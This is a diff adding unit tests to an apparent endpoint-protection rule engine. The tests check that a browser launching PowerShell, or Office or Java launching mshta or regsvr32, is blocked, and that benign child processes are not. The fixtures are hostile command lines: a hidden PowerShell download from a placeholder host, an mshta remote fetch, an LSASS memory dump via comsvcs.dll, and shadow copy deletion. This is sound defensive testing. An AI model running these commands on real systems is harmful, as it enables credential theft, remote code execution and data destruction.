@@ -57,6 +57,41 @@ int main() {
                    .commandLine = L"rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 712 C:\\t\\l.dmp full"};
     CHECK(Fired(Evaluate(p, policy), L"attackSurface.blockCredentialStealingLsass"));
   }
+  {  // Exploit blocker: a browser starting PowerShell is blocked even with every ASR rule off
+    BehaviorPolicy off;
+    ProcessFacts p{.imagePath = L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+                   .commandLine = L"powershell -w hidden -c iwr http://x/a.ps1",
+                   .parentImagePath = L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"};
+    const auto d = Evaluate(p, off);
+    CHECK(Fired(d, L"edr.exploitProtection"));
+    CHECK(Strongest(d) == RuleMode::Block);
+    off.exploitProtection = false;
+    CHECK(!Fired(Evaluate(p, off), L"edr.exploitProtection"));
+  }
+  {  // Exploit blocker leaves alone: Chrome's native messaging hosts (password managers) via cmd, a browser opening
+     // a downloaded installer, Word running PowerShell (a macro; ASR decides), and an IDE on Java running cmd
+    BehaviorPolicy off;
+    ProcessFacts host{.imagePath = L"C:\\Windows\\System32\\cmd.exe",
+                      .commandLine = L"C:\\Windows\\system32\\cmd.exe /d /s /c \"\"C:\\pm\\host.exe\" chrome-extension://abc/ --parent-window=0\"",
+                      .parentImagePath = L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"};
+    CHECK(!Fired(Evaluate(host, off), L"edr.exploitProtection"));
+    ProcessFacts installer{.imagePath = L"C:\\Users\\a\\Downloads\\setup.exe",
+                           .parentImagePath = L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"};
+    CHECK(!Fired(Evaluate(installer, off), L"edr.exploitProtection"));
+    ProcessFacts macro{.imagePath = L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+                       .parentImagePath = L"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE"};
+    CHECK(!Fired(Evaluate(macro, off), L"edr.exploitProtection"));
+    ProcessFacts ide{.imagePath = L"C:\\Windows\\System32\\cmd.exe",
+                     .parentImagePath = L"C:\\Program Files\\Java\\jdk-21\\bin\\java.exe"};
+    CHECK(!Fired(Evaluate(ide, off), L"edr.exploitProtection"));
+    // ...but Excel or Java starting mshta / regsvr32 is
+    ProcessFacts mshta{.imagePath = L"C:\\Windows\\System32\\mshta.exe", .commandLine = L"mshta http://x/a.hta",
+                       .parentImagePath = L"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE"};
+    CHECK(Fired(Evaluate(mshta, off), L"edr.exploitProtection"));
+    ProcessFacts regsvr{.imagePath = L"C:\\Windows\\System32\\regsvr32.exe",
+                        .parentImagePath = L"C:\\Program Files\\Java\\jre\\bin\\javaw.exe"};
+    CHECK(Fired(Evaluate(regsvr, off), L"edr.exploitProtection"));
+  }
   {  // Shadow copy deletion is blocked by the ransomware setting even with ASR off
     BehaviorPolicy off;
     ProcessFacts p{.imagePath = L"C:\\Windows\\System32\\vssadmin.exe", .commandLine = L"vssadmin delete shadows /all /quiet"};
